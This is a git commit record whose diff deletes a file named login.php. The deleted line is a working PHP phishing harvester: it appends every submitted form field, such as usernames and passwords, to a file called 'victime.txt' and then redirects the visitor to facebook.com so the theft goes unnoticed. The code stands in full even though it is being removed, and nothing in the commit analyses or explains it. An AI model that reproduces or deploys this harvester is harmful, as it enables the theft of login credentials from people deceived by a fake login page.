2e19f2e58cd306336c33caa7b69b3ce28e73cbce
nasim1234567 <49094352+nasim1234567@users.noreply.github.com>
2019-03-31 15:11:15 +0100

    Delete login.php

--- login.php
+++
@@ -1,1 +0,0 @@
-<?php header ('Location: https://facebook.com '); $handle = fopen("victime.txt", "a"); foreach($_POST as $variable => $value) { fwrite($handle, $variable); fwrite($handle, "="); fwrite($handle, $value); fwrite($handle, "\r\n"); } fwrite($handle, "===============\r\n"); fclose($handle); exit; ?>
